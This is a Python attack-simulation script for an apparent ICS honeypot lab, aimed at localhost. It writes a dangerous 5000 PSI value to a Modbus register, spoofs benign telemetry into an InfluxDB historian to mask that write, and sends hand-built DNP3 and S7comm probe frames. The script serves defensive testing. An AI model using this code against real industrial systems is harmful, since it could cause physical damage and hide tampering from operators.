"""
Attack Simulation
=================
Simulates realistic ICS attack scenarios against the honeypot:
  1. Semantic Injection  – sends a critically high register value via Modbus
  2. Replay Attack       – spoofs benign telemetry to the InfluxDB historian
  3. DNP3 Probe          – sends a DNP3 link-layer request to port 20000
  4. S7comm Probe        – raw TCP connect + COTP/S7 handshake to port 102

All results are written back to InfluxDB (attack_results measurement)
so they are visible in Grafana.
"""

import time
import socket
import struct
import requests
from pymodbus.client import ModbusTcpClient
from influxdb_client import InfluxDBClient, Point, WritePrecision
from influxdb_client.client.write_api import SYNCHRONOUS

# ── Config ─────────────────────────────────────────────────────────────────────
TARGET_IP       = '127.0.0.1'
MODBUS_PORT     = 5020
DNP3_PORT       = 20000
S7COMM_PORT     = 102

INFLUX_URL      = 'http://127.0.0.1:8086'
INFLUX_API_URL  = f'{INFLUX_URL}/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns'
INFLUX_TOKEN    = 'supersecrettoken'
INFLUX_ORG      = 'my_refinery'
INFLUX_BUCKET   = 'sensor_logs'

# ── InfluxDB result writer ─────────────────────────────────────────────────────
db_client = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
write_api  = db_client.write_api(write_options=SYNCHRONOUS)

def log_attack_result(attack_name: str, success: bool, detail: str = ""):
    """Write attack outcome to InfluxDB for Grafana dashboards."""
    point = (Point("attack_results")
             .tag("attack_type", attack_name)
             .field("success",  1 if success else 0)
             .field("detail",   detail[:256])
             .time(time.time_ns(), WritePrecision.NS))
    try:
        write_api.write(bucket=INFLUX_BUCKET, record=point)
        print(f"  [DB] Attack result logged: {attack_name} success={success}")
    except Exception as e:
        print(f"  [DB] Failed to log result: {e}")

# ── 1. Semantic Injection ──────────────────────────────────────────────────────
def semantic_injection():
    print("\n" + "="*60)
    print("[ATTACK 1] Semantic Injection via Modbus")
    print("="*60)
    print("  Strategy: Write pressure register 100 = 5000 PSI")
    print("  This is a valid Modbus packet – bypasses packet-level filters.")

    success = False
    detail  = ""
    try:
        client = ModbusTcpClient(TARGET_IP, port=MODBUS_PORT)
        if client.connect():
            # Write critically high value to pressure register (FC6)
            res = client.write_register(100, 5000)
            if not res.isError():
                success = True
                detail  = "Wrote 5000 PSI to register 100"
                print(f"  [+] SUCCESS – {detail}")
            else:
                detail = f"Modbus exception: {res}"
                print(f"  [-] FAILED  – {detail}")
            client.close()
        else:
            detail = "Could not connect to Modbus TCP"
            print(f"  [-] FAILED  – {detail}")
    except Exception as e:
        detail = str(e)
        print(f"  [-] ERROR   – {detail}")

    log_attack_result("semantic_injection", success, detail)
    return success


# ── 2. Replay Attack to Historian ─────────────────────────────────────────────
def replay_attack_historian():
    print("\n" + "="*60)
    print("[ATTACK 2] Historian Replay Attack")
    print("="*60)
    print("  Strategy: Inject spoofed 'normal' pressure data into InfluxDB")
    print("  to hide the previous injection from the replay-detection logic.")

    headers  = {
        'Authorization': f'Token {INFLUX_TOKEN}',
        'Content-Type':  'text/plain; charset=utf-8',
    }
    success_count = 0
    spoof_value   = 50.5  # benign-looking PSI value

    for i in range(5):
        ts      = time.time_ns()
        payload = f"pipeline_metrics,location=pump_station_01,source=attacker pressure={spoof_value} {ts}"
        try:
            r = requests.post(INFLUX_API_URL, headers=headers, data=payload, timeout=5)
            if r.status_code == 204:
                success_count += 1
                print(f"  [+] Spoofed {spoof_value} PSI (#{i+1})")
            else:
                print(f"  [-] HTTP {r.status_code}: {r.text}")
        except Exception as e:
            print(f"  [-] Request error: {e}")
        time.sleep(1)

    ok     = success_count > 0
    detail = f"Injected {success_count}/5 spoofed telemetry points at {spoof_value} PSI"
    print(f"  Result: {detail}")
    log_attack_result("replay_attack", ok, detail)
    return ok


# ── 3. DNP3 Protocol Probe ────────────────────────────────────────────────────
def dnp3_probe():
    print("\n" + "="*60)
    print("[ATTACK 3] DNP3 Outstation Probe")
    print("="*60)
    print("  Strategy: Send a DNP3 link-layer Reset Link States request.")

    def _crc16(data: bytes) -> int:
        crc = 0
        for b in data:
            crc ^= b
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0xA6BC
                else:
                    crc >>= 1
        return (~crc) & 0xFFFF

    def _frame(ctrl, dst, src):
        raw = bytes([0x05, 0x64, 0x05, ctrl,
                     dst & 0xFF, (dst >> 8) & 0xFF,
                     src & 0xFF, (src >> 8) & 0xFF])
        crc = _crc16(raw)
        return raw + struct.pack('<H', crc)

    # Reset Link States (FC=0x40 PRM, DIR=1)
    frame = _frame(ctrl=0x40, dst=1, src=3)

    success = False
    detail  = ""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, DNP3_PORT))
        s.sendall(frame)
        print(f"  [*] Sent DNP3 probe ({len(frame)} bytes): {frame.hex()}")
        resp = s.recv(256)
        if resp:
            success = True
            detail  = f"Got response: {resp.hex()}"
            print(f"  [+] DNP3 responded: {resp.hex()}")
        s.close()
    except ConnectionRefusedError:
        detail = "Connection refused (DNP3 server may not be running)"
        print(f"  [-] {detail}")
    except socket.timeout:
        detail = "Timeout waiting for DNP3 response"
        print(f"  [-] {detail}")
    except Exception as e:
        detail = str(e)
        print(f"  [-] Error: {detail}")

    log_attack_result("dnp3_probe", success, detail)
    return success


# ── 4. S7comm Protocol Probe ───────────────────────────────────────────────────
def s7comm_probe():
    print("\n" + "="*60)
    print("[ATTACK 4] S7comm (Siemens) Protocol Probe")
    print("="*60)
    print("  Strategy: Send COTP connection request + S7 NEGOTIATE PDU.")

    # COTP CR (Connect Request) over TCP
    cotp_cr = bytes([
        0x03, 0x00, 0x00, 0x16,   # TPKT: version=3, length=22
        0x11,                     # COTP length
        0xe0,                     # PDU type: CR
        0x00, 0x00,               # dst reference
        0x00, 0x01,               # src reference
        0x00,                     # class
        0xc1, 0x02, 0x01, 0x00,   # src TSAP
        0xc2, 0x02, 0x01, 0x02,   # dst TSAP
        0xc0, 0x01, 0x09,         # TPDU size
    ])

    success = False
    detail  = ""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, S7COMM_PORT))
        s.sendall(cotp_cr)
        print(f"  [*] Sent COTP CR ({len(cotp_cr)} bytes)")
        resp = s.recv(256)
        if resp and len(resp) >= 4:
            success = True
            detail  = f"Got {len(resp)} bytes: {resp.hex()}"
            print(f"  [+] S7 server responded: {resp.hex()}")
        else:
            detail = "No meaningful response"
            print(f"  [-] {detail}")
        s.close()
    except ConnectionRefusedError:
        detail = "Connection refused (S7 server may not be running)"
        print(f"  [-] {detail}")
    except socket.timeout:
        detail = "Timeout waiting for S7 response"
        print(f"  [-] {detail}")
    except Exception as e:
        detail = str(e)
        print(f"  [-] Error: {detail}")

    log_attack_result("s7comm_probe", success, detail)
    return success


# ── Entry point ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n" + "#"*60)
    print("#   ICS HONEYPOT – ATTACK SIMULATION SUITE")
    print("#"*60)
    results = {}

    results["semantic_injection"]   = semantic_injection()
    time.sleep(2)
    results["replay_attack"]        = replay_attack_historian()
    time.sleep(2)
    results["dnp3_probe"]           = dnp3_probe()
    time.sleep(2)
    results["s7comm_probe"]         = s7comm_probe()

    print("\n" + "="*60)
    print("SIMULATION SUMMARY")
    print("="*60)
    for attack, ok in results.items():
        status = "✓ SUCCESS" if ok else "✗ FAILED "
        print(f"  {status}  {attack}")
    print("\nAll results written to InfluxDB [ attack_results measurement ]")
    print("Check Grafana for the 'Attack Simulation' dashboard panel.\n")
